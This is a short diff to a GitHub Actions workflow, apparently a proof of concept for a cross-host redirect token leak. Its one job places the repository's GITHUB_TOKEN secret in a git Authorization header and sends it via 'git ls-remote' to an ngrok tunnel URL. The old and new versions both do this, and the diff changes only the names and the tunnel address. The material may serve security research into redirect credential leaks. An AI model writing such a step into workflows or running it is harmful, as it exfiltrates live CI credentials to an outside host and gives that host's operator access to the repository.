@@ -1,11 +1,11 @@
-name: real-token-test
+name: cross-host-token-leak
 on: workflow_dispatch
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Token leak via git redirect
+      - name: Cross-host redirect token leak
         env:
           GH_TOK: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          git -c http.extraHeader="Authorization: token $GH_TOK" ls-remote https://8b0b-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
+          git -c "http.extraHeader=Authorization: token $GH_TOK" ls-remote https://53b8-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
